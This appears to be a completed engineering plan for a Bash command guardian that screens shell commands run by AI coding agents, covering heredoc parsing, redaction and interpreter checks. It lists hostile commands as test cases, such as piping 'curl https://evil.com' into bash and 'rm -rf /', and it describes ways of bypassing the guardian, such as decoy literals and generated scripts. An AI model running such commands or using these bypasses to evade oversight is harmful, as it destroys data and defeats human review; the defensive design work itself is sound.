---
status: done
progress: "All 4 phases complete and verified. Phase 0: delimiter parsing fixes + re.MULTILINE audit. Phase 1: heredoc body redaction with hybrid classifier. Phase 2: interpreter path resolution for F1. Phase 3: interpreter+heredoc ASK backstop. 69 Phase 3 tests, 1086 total pass, 4 bypasses found+fixed across 2 verification rounds."
---

# Unified Plan: Heredoc Scanning Redesign + Interpreter Path Resolution

**Date**: 2026-03-21
**Severity**: HIGH (CRITICAL regression prevention + MEDIUM usability fixes)
**Supersedes**: `heredoc-pattern-false-positives.md` (Plan A), `interpreter-path-resolution.md` (Plan B)
**Related**: `interpreter-heredoc-bypass.md` (incorporated as Phase 3, not subsumed)
**Basis**: 2-round multi-model review (Opus 4.6, Codex 5.2, Gemini 3.1 Pro) — see `temp/final-verdict.md`

---

## Problem

Two independent usability problems degrade guardian effectiveness through alert fatigue:

**1. Heredoc body false positives.** Layer 0 (`match_block_patterns`) and Layer 0b (`match_ask_patterns`) scan the raw command string before `split_commands()` processes heredoc bodies. Text in data heredoc bodies (documentation, tutorials, seed data) triggers false DENY or ASK. Confirmed false positives: `git push --force` in tutorials, `find -delete` in cleanup notes, `curl|bash` in install docs, SQL in seed data.

**2. Interpreter path resolution false positives.** When `python3 -c "os.remove(file)"` targets safe project-internal paths (e.g., `.staging/` cleanup), the F1 safety net fires ASK because `extract_paths()` cannot resolve paths from interpreter source code. This triggers 5-10 unnecessary interruptions per session, conditioning users to auto-allow — itself a security failure.

**3. Pre-existing bugs.** `_parse_heredoc_delimiter()` mishandles backslash-escaped and ANSI-C quoted delimiters. The absence of `re.MULTILINE` in pattern matching is an accidental defense-in-depth mechanism requiring per-pattern audit.

### What is NOT broken (adversarial corrections)

- **Scenarios A/B are not actual false positives.** `rm -rf /` in heredoc bodies does NOT match block patterns today because `$` anchor (without `re.MULTILINE`) requires end-of-string. Real false positives exist (Scenarios C-I) but the two most dramatic examples were wrong.
- **"Generated executable bypass" is pre-existing.** `cat > script.sh << 'EOF'\nrm -rf /\nEOF\nbash script.sh` is NOT caught by Layer 0 today. Pre-existing architectural limitation, not a new regression.
- **re.MULTILINE is double-edged.** Adding it would INCREASE false positives by making `$` match end-of-line. Requires per-pattern audit, not blind addition.

### Architectural Decision: Shared Parser, Not Second Parser

Both Codex and Gemini independently concluded: do NOT build a separate `redact_safe_heredocs()` walker. Instead, integrate redaction into the existing `split_commands()` loop. The existing parser already tracks `depth`, `in_single_quote`, `brace_group_depth`, `arithmetic_depth`, comments, process substitution, and heredoc state. A second parser WILL diverge on edge cases, creating a parsing differential vulnerability. Single-pass, single-parser, two outputs.

---

## Phase 0: Bug Fixes (no dependencies, implement first)

- [x] **0a. Fix `_parse_heredoc_delimiter()` for backslash + ANSI-C quoting.**
  - File: `hooks/scripts/bash_guardian.py`, lines 443-473
  - Bug: `cat << \EOF` stores `\EOF` as delimiter instead of `EOF`, causing `_consume_heredoc_bodies()` to consume all remaining input as body, silently discarding subsequent commands
  - Fix: Add ANSI-C quoting handler (`$'EOF'` → `EOF`, `$"EOF"` → `EOF`) before existing quoted-delimiter branch. Strip backslashes from bare-word delimiters (`\EOF` → `EOF`)
  - Tests: `cat << \EOF`, `cat << $'EOF'`, `cat << $"EOF"` — verify subsequent `rm -rf .git` appears as separate sub-command

- [x] **0b. Audit `re.MULTILINE` impact per-pattern.**
  - Files: `assets/guardian.default.json` (block patterns lines 11-83, ask patterns 85-158), `assets/guardian.recommended.json`
  - For each pattern using `$` or `^` anchors: document whether `re.MULTILINE` would help or hurt
  - Decision: defer adding `re.MULTILINE` until AFTER Phase 1 ships — Phase 1 changes what Layer 0/0b sees, making the audit dependent on Phase 1 behavior
  - Result: audit document with per-pattern recommendation

- [x] **0c. Tests for Phase 0 fixes.**
  - New test file: `tests/regression/test_delimiter_parsing.py`
  - ~10 test methods covering backslash, ANSI-C, locale delimiters
  - Regression: existing 168+ heredoc tests must still pass

---

## Phase 1: Heredoc Body Redaction (depends on Phase 0)

Modify `split_commands()` to optionally return a redacted version of the raw command alongside the sub-command list. Safe heredoc bodies (data sinks) are replaced with empty lines; unsafe bodies (interpreters, write-to-file, pipelines, unknown) are retained. Layer 0/0b scan the redacted string. All other layers use the original.

- [x] **1a. Extend `split_commands()` with redaction support.**
  - File: `hooks/scripts/bash_guardian.py`, `split_commands()` (def at ~line 97, parser loop 270-441), `_consume_heredoc_bodies()` (476-506)
  - New signature: `split_commands(command, redact_safe_heredocs=False) -> list[str] | tuple[list[str], str]`
  - Modify `_consume_heredoc_bodies()` to optionally return body ranges with safety classification
  - Build redacted string by replacing safe body content with empty lines (preserve newline count to prevent token merging and line alignment changes)
  - Backward compatible: default `False` returns list only (no breaking changes)
  - **V1 fix (F1-1 CRITICAL)**: Store heredoc origin metadata at `<<` parse time (line 415-417), NOT at body consumption time (line 426). When `<<` is detected, capture the current `cmd_so_far` text as the heredoc's origin command. This origin persists across ALL separator splits (`;`, `&&`, `||`, `|`, `&`), not just pipes. At body consumption time, the classifier uses the stored origin, not the current segment's `cmd_before_heredoc`. This fixes the critical bug where `bash << EOF ; cat\nrm -rf .git\nEOF` would see `cat` instead of `bash` as the heredoc's command.

- [x] **1b. Implement hybrid heredoc classifier: `_classify_heredoc_safety()`.**
  - Classification priority (rule ordering is critical — rules 1-3 checked BEFORE rule 4):
    1. Base command in `_INTERPRETER_COMMANDS` → UNSAFE (retain body)
    2. Output redirection (`>`, `>>`, `>|`, `&>`, `n>`) present → UNSAFE (retain body)
    3. Pipeline member (heredoc crossed a `|` boundary) → UNSAFE (retain body)
    4. Base command in `_PASSIVE_DATA_SINKS` → SAFE (redact body)
    5. Unknown command → UNSAFE (fail-closed, retain body)
  - `_PASSIVE_DATA_SINKS`: `cat`, `grep`, `egrep`, `fgrep`, `head`, `tail`, `wc`, `uniq`, `cut`, `tr`, `fold`, `fmt`, `column`, `paste`, `join`, `comm`, `echo`, `printf`, `jq`, `yq`, `diff`, `cmp`, `md5sum`, `sha256sum`
  - **V1 fix (F1-2 HIGH)**: `tee` REMOVED from `_PASSIVE_DATA_SINKS` — `tee` writes heredoc body to files without using `>` operator, so Rule 2 cannot catch it. `tee script.sh << EOF` writes the body to `script.sh`. `sort` also excluded (has `-o` output flag).
  - `_INTERPRETER_COMMANDS`: `bash`, `sh`, `zsh`, `dash`, `ksh`, `csh`, `tcsh`, `fish`, `python`, `python2`, `python3`, `py`, `node`, `deno`, `bun`, `perl`, `ruby`, `source`, `eval`, `exec`
  - `_extract_base_command()`: strips env prefixes, variable assignments, sudo, paths. Fails closed (empty string → rule 5)
  - **V2 fix (MEDIUM)**: `_extract_base_command()` must also skip I/O redirect tokens (`<`, `>`, `>>`, `<<` and their targets) before identifying the base command. Without this, `< /dev/null bash << EOF` returns `"<"` instead of `"bash"`, causing Phase 1 to fail-closed (safe) but Phase 3 backstop to miss the interpreter (defense-in-depth gap).
  - `_OUTPUT_REDIR_PATTERN`: regex matching `>`, `>>`, `>|`, `&>`, `>&`, `n>`, `n>>`
  - **V1 fix (F1-3 MEDIUM)**: `>&` redirect operator added to regex. Must distinguish `>& file` (redirect to file) from `>&2` (fd duplication) via negative lookahead for digit/dash targets.

- [x] **1c. Integrate into `main()`.**
  - File: `hooks/scripts/bash_guardian.py`, lines 1419-1442
  - Move `split_commands()` call BEFORE Layer 0 with `redact_safe_heredocs=True`
  - Layer 0: `match_block_patterns(redacted_command)`
  - Layer 0b: `match_ask_patterns(redacted_command)`
  - Layer 1, 3, 4: unchanged (use original `sub_commands`)
  - Key invariant: ONLY Layer 0/0b see the redacted string

- [x] **1d. Design attack validation.**
  - This approach was proposed by R1 review but never adversarially attacked. It MUST receive the same scrutiny before shipping.
  - Traced attacks (from `temp/draft-plan-technical.md` section 1f):
    - Overlapping heredocs: both classified via same `cmd_before_heredoc` → safe
    - Same delimiter twice: separate commands, separate classification → safe
    - Heredoc in process substitution: depth > 0, body not consumed → stays in raw string → safe
    - Redacted body synthetic match: newline preservation prevents token merging → safe
    - Unterminated heredoc: fail-closed, body retained → safe
    - Write-to-file: Rule 2 catches `>` → body retained → safe (but Layer 0 `$` anchor issue is pre-existing)
    - Here-string (`<<<`): excluded from heredoc detection at line 401 → unaffected
    - Complex env prefixes: `_extract_base_command()` strips them → correct
    - eval wrapping: `eval` in `_INTERPRETER_COMMANDS` → body retained → safe

- [x] **1e. Tests for Phase 1.**
  - New test file: `tests/regression/test_heredoc_redaction.py`, ~25 methods
  - Safe redaction: `cat << EOF` with dangerous body → body not in redacted string
  - Unsafe retention: `bash << EOF`, `python3 << EOF`, `cat > file << EOF`, `cat << EOF | bash`, unknown commands → body in redacted string
  - Pipeline preservation: `curl ... | bash` unchanged in redacted string
  - Newline preservation: redacted body has same newline count as original
  - Edge cases: unterminated heredoc (fail-closed), process substitution (depth > 0), backward compatibility (default returns list)
  - Critical regression: `rm -rf /`, `curl|bash`, `git push --force`, `python3 -c "os.remove('.env')"` all still detected

---

## Phase 2: F1 Interpreter Path Resolution (independent of Phase 1)

Reduce F1 ASK frequency for legitimate interpreter operations by extracting paths from `-c`/`-e` payloads. This is NOT "suppressing F1" — it gives F1 the information it needs to route through the normal path validation pipeline instead of falling back to a blanket ASK.

- [x] **2a. Implement `extract_paths_from_interpreter_payload()`.**
  - File: `hooks/scripts/bash_guardian.py`, near `extract_paths()` (line 980)
  - Regex extraction of single/double-quoted string literals from interpreter payloads
  - URL filtering: skip strings containing `://`
  - MIME filtering: skip strings with single `/` not starting with `.` or `/` (e.g., `application/json`)
  - Path validation: resolved path must be within `project_dir`
  - Glob expansion restricted to project-internal paths only
  - **V1 fix (F2-1 CRITICAL)**: Project boundary check MUST use `Path.relative_to()` (as existing codebase does at lines 1008, 1114), NOT `str.startswith()`. The `startswith` approach confuses `/tmp/proj` with `/tmp/proj_evil`.
  - **V1 fix (F2-2 MEDIUM)**: Reject string literals containing interpolation markers (`{}`, `$`) — these indicate f-strings or template literals whose runtime values are unresolvable.
  - Fail-closed: returns `[]` if no paths extracted → F1 ASK fires
  - Documented limitations (all fail-closed): f-strings, triple-quotes, string concatenation, chr() encoding, variable-only paths

- [x] **2b. Modify F1 block to attempt interpreter path resolution.**
  - File: `hooks/scripts/bash_guardian.py`, lines 1474-1481
  - When F1 would fire AND command is an interpreter operation: call `extract_paths_from_interpreter_payload()`
  - If paths extracted: set `sub_paths = interp_paths`, fall through to normal validation loop (zeroAccess, readOnly, noDelete, symlink checks all apply)
  - If no paths extracted: enriched F1 ASK with detected API name (e.g., "Detected delete via os.remove but could not resolve target paths")
  - Non-interpreter commands: standard F1 ASK unchanged

- [x] **2c. Enrich F1 ASK messages (ships independently of 2a/2b).**
  - Even when path resolution is not implemented, enrich F1 messages with detected API + payload excerpt
  - Before: `"Detected delete but could not resolve target paths"`
  - After: `"Detected delete via os.remove but could not resolve target paths"`

- [x] **2d. Tests for Phase 2.**
  - New test file: `tests/regression/test_interpreter_path_resolution.py`, ~15 methods
  - Motivating case: `python3 -c "glob.glob('.staging/*.json')... os.remove(f)"` → paths extracted
  - Variable-only paths: `os.remove(path_var)` → empty, F1 ASK fires
  - Obfuscated paths: `os.remove(chr(46)+'env')` → empty, F1 ASK fires
  - URL strings: `'https://example.com'` → filtered out
  - Non-interpreter: `rm -f file.txt` → empty (not interpreter), standard F1 ASK
  - Security regression: single-line `python3 -c "os.remove('.env')"` → still blocked at Layer 0
  - Integration: verify full main() flow with path resolution active

### Phase 2 design notes

- The decoy literal attack (benign string alongside `chr()`-encoded target suppresses F1) is valid in theory but violates the stated threat model: AI agents generate straightforward code, not obfuscated payloads. Alert fatigue from 5-10 ASKs per session is a more concrete security failure than a theoretical attack requiring adversarial code injection.
- F1 verdict changes ASK → ALLOW only when ALL extracted paths pass the full validation pipeline. If ANY path fails, F1 still fires.
- `glob.glob()` already exists in baseline `extract_paths()` at `bash_guardian.py:971`. The new code is strictly MORE restrictive (project-internal only).

---

## Phase 3: Interpreter+Heredoc ASK Backstop (depends on Phase 1)

Defense-in-depth for interpreter heredoc bodies that evade block patterns. Plan A's claim to subsume `interpreter-heredoc-bypass.md` was invalid: `[^|&\n]*` in block patterns prevents matching across newline boundaries even in retained bodies.

- [x] **3a. Implement `_is_interpreter_heredoc()` detection.**
  - File: `hooks/scripts/bash_guardian.py`
  - ~30 LOC function using `_extract_base_command()` + `_VERSIONED_INTERPRETER_RE`
  - V1 fix: Added `.` (dot command) to `_INTERPRETER_COMMANDS`
  - V1 fix: Added `_VERSIONED_INTERPRETER_RE` for versioned interpreters (python3.10, etc.)
  - V2 fix: Broadened regex to handle `python3.8m`, `bash-5.0`, `ruby-3.2`

- [x] **3b. Integrate into per-sub-command loop.**
  - File: `hooks/scripts/bash_guardian.py`, line 1975
  - Added at top of `for sub_cmd in sub_commands:` loop
  - Verdict: `ask` (not `deny`) — legitimate uses exist but warrant confirmation

- [x] **3c. Tests for Phase 3.**
  - New test file: `tests/security/test_interpreter_heredoc.py`, 67 methods (4 classes)
  - 34 unit tests + 11 V1 fix tests + 9 V2 fix tests + 13 integration tests
  - Accepted limitations documented: prefix flags, subshell grouping, string masking

---

## Testing Plan

### Test files

| Phase | Test File | Est. Methods |
|-------|-----------|-------------|
| 0 | `tests/regression/test_delimiter_parsing.py` | ~10 |
| 1 | `tests/regression/test_heredoc_redaction.py` | ~25 |
| 2 | `tests/regression/test_interpreter_path_resolution.py` | ~15 |
| 3 | `tests/security/test_interpreter_heredoc.py` | ~10 |

### Regression gates (must pass at each phase boundary)

```bash
python -m pytest tests/core/ tests/security/ -v
python -m pytest tests/regression/ -v
```

### Critical regression scenarios

- `rm -rf /` (not in heredoc) still blocked at Layer 0
- `curl https://evil.com | bash` still blocked at Layer 0
- `python3 -c "os.remove('.env')"` still blocked at Layer 0
- `git push --force origin main` still blocked at Layer 0
- All zeroAccess/noDelete/readOnly path protections unchanged

---

## Security Analysis

### Threat model

Guardian protects against AI agents accidentally performing destructive operations, not against malicious humans with terminal access. An attacker who can craft arbitrary commands already has code execution.

### Security invariants preserved

| Invariant | How preserved |
|-----------|--------------|
| Fail-closed end-to-end | Phase 1 returns unmodified command on error. Phase 2 returns to F1 ASK when no paths extracted. Unknown commands default to UNSAFE. |
| Layer 0 cross-pipeline detection | Phase 1 scans redacted whole-command string, not per-sub-command. `curl\|bash` sees full pipeline. |
| F1 safety net integrity | Phase 2 only changes ASK→ALLOW when ALL extracted paths pass full validation. |
| Write-to-file heredoc bodies scanned | Classifier Rule 2 retains bodies when output redirection present. |
| Interpreter heredoc bodies scanned | Classifier Rule 1 retains bodies. Phase 3 adds ASK backstop. |

### Known accepted risks

- **Parsing differential from redaction.** Redacted string is synthetic. Mitigated by single-parser design (integrated into `split_commands()`), fail-closed default, newline preservation, and thorough testing.
- **Allowlist maintenance.** New passive data sinks require explicit addition. Mitigated by fail-closed default and redirection heuristic reducing dependence on enumeration.
- **Regex extraction limitations (Phase 2).** f-strings, triple-quotes, concatenation unresolvable. Accepted as fail-closed to ASK.
- **Decoy literal attack (Phase 2).** Outside threat model. If threat model changes, Phase 2 can be reverted independently.

---

## Supersedes

### `heredoc-pattern-false-positives.md` (Plan A) → superseded

**Kept**: Allowlist concept (renamed `_PASSIVE_DATA_SINKS`), wrapper-flag handling, backslash delimiter fix, test structure.

**Discarded**: Per-sub-command Layer 0/0b scanning (breaks `curl|bash`), pipe-to-interpreter mitigation inside `split_commands()` (structurally broken), subsumption claim over `interpreter-heredoc-bypass.md` (invalid).

**Why**: Plan A's core architecture caused a CRITICAL `curl|bash` regression. This plan preserves Plan A's valuable components with a different architecture (whole-command redaction via integrated parser).

### `interpreter-path-resolution.md` (Plan B) → superseded

**Kept**: Problem statement, fail-closed design, `glob.glob()` expansion concept.

**Constrained**: `glob.glob()` restricted to project-internal paths. Regex limitations accepted as documented.

**Not discarded**: The initial review's recommendation to dismiss Plan B entirely was overcorrection. Alert fatigue from preserved F1 ASK is a larger real-world security risk than the theoretical decoy literal attack.

**Why**: Plan B is incorporated as Phase 2 for correct ordering and to prevent conflicting changes.

### `interpreter-heredoc-bypass.md` → NOT superseded, incorporated as Phase 3

Plan A incorrectly claimed to subsume this plan. It remains independently needed and is implemented as Phase 3 for ordering purposes. The original plan document remains valid.

---

## Estimated Effort

| Phase | Code LOC | Test LOC | Sessions |
|-------|----------|----------|----------|
| 0 | ~20 | ~40 | 0.5 |
| 1 | ~150 | ~200 | 1-2 |
| 2 | ~80 | ~120 | 1 |
| 3 | ~25 | ~80 | 0.5 |
| **Total** | **~275** | **~440** | **3-4** |

## Files to Modify

| Phase | File | Change |
|-------|------|--------|
| 0a | `hooks/scripts/bash_guardian.py` | Fix `_parse_heredoc_delimiter()` |
| 0b | `assets/guardian.default.json`, `assets/guardian.recommended.json` | Audit + document re.MULTILINE per pattern |
| 1a | `hooks/scripts/bash_guardian.py` | Extend `split_commands()` + `_consume_heredoc_bodies()` |
| 1b | `hooks/scripts/bash_guardian.py` | New: `_classify_heredoc_safety()`, `_PASSIVE_DATA_SINKS`, `_INTERPRETER_COMMANDS`, `_OUTPUT_REDIR_PATTERN`, `_extract_base_command()` |
| 1c | `hooks/scripts/bash_guardian.py` | Modify `main()` Layer 0/0b to use redacted string |
| 2a | `hooks/scripts/bash_guardian.py` | New: `extract_paths_from_interpreter_payload()` |
| 2b | `hooks/scripts/bash_guardian.py` | Modify F1 block (lines 1474-1481) |
| 2c | `hooks/scripts/bash_guardian.py` | Enrich F1 ASK messages |
| 3a-b | `hooks/scripts/bash_guardian.py` | New: `_is_interpreter_heredoc()` + loop integration |

## Technical Reference

Detailed code, pseudocode, traced edge cases, and cross-model review notes: `temp/draft-plan-technical.md`
